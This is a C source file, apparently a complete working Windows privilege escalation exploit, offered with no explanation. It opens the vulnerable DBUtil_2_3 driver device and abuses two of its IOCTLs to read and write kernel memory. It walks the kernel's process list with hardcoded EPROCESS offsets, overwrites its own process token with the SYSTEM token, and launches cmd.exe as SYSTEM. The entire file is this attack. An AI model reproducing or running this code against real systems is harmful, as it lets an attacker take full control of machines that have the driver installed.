#include <windows.h>
#pragma comment(lib, "psapi.lib")

const unsigned long PID_OFFSET = 0x440;
const unsigned long APLINKS_OFFSET = 0x448;
const unsigned long TOKEN_OFFSET = 0x4B8;

struct DbMemcpy {
    DWORD64 key;
    ULONG_PTR ptr;
    DWORD offset;
    DWORD pad;
    BYTE content[0];
};

BOOL read(HANDLE hdev, ULONG_PTR ptr, DWORD size, LPVOID out) {
    SIZE_T bufsz = sizeof(struct DbMemcpy) + size;
    struct DbMemcpy* db = (struct DbMemcpy*)calloc(1, bufsz);
    db->ptr = ptr;

    BOOL ret = DeviceIoControl(
        hdev,
        0x9B0C1EC4,
        db,
        bufsz,
        db,
        bufsz,
        NULL,
        NULL
    );
    if (TRUE == ret){
        memcpy(out, db->content, size);
    }
    free(db);
    return ret;
}

BOOL write(HANDLE hdev, ULONG_PTR ptr, BYTE* content, DWORD size) {
    SIZE_T bufsz = sizeof(struct DbMemcpy) + size;
    struct DbMemcpy* db = (struct DbMemcpy*)calloc(1, bufsz);
    db->ptr = ptr;
    memcpy(db->content, content, size);

    BOOL ret = DeviceIoControl(
        hdev,
        0x9B0C1EC8,
        db,
        bufsz,
        db,
        bufsz,
        NULL,
        NULL
    );
    free(db);
    return ret;
}

BOOL read_ptr(HANDLE hdev, ULONG_PTR src, ULONG_PTR* out) {
    return read(hdev, src, sizeof(LPVOID), (LPVOID)out);
}

BOOL write_ptr(HANDLE hdev, ULONG_PTR dst, ULONG_PTR val) {
    return write(hdev, dst, (LPVOID)&val, sizeof(LPVOID));
}

LPVOID get_kernel_base() {
    DWORD lpcbNeeded = 0;
    LPVOID* bases = NULL;
    CHAR namebuf[MAX_PATH] = {0};
    LPVOID ret = NULL;

    EnumDeviceDrivers(NULL, 0, &lpcbNeeded);
    bases = malloc(lpcbNeeded);
    EnumDeviceDrivers(bases, lpcbNeeded, &lpcbNeeded);

    for (int i = 0; i < lpcbNeeded / sizeof(LPVOID); i++) {
        GetDeviceDriverBaseNameA(bases[i], namebuf, MAX_PATH);
        if (!stricmp(namebuf, "ntoskrnl.exe")) {
            ret = bases[i];
            break;
        }
    }

    free(bases);
    return ret;  
}

int main(int argc, char** argv) {
    ULONG_PTR isp, systoken, curproc, lpisp;
    DWORD64 mypid = (DWORD64)GetCurrentProcessId(), curpid = 0;
    LPVOID kernel_base = get_kernel_base();
    HANDLE hdev = CreateFileA(
        "\\\\.\\DBUtil_2_3",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    HMODULE hkernel = LoadLibraryA("ntoskrnl.exe");

    lpisp = (ULONG_PTR)GetProcAddress(hkernel, "PsInitialSystemProcess") -
        (ULONG_PTR)hkernel + (ULONG_PTR)kernel_base;
    read_ptr(hdev, lpisp, &isp);
    read_ptr(hdev, isp+TOKEN_OFFSET, &systoken);
    curproc = isp;
    while (curpid != mypid) {
        read_ptr(hdev, curproc+APLINKS_OFFSET, &curproc);
        curproc -= APLINKS_OFFSET;
        read_ptr(hdev, curproc+PID_OFFSET, (ULONG_PTR*)&curpid);
    }

    write_ptr(hdev, curproc+TOKEN_OFFSET, systoken);
    system("cmd.exe");
    return 0;
}
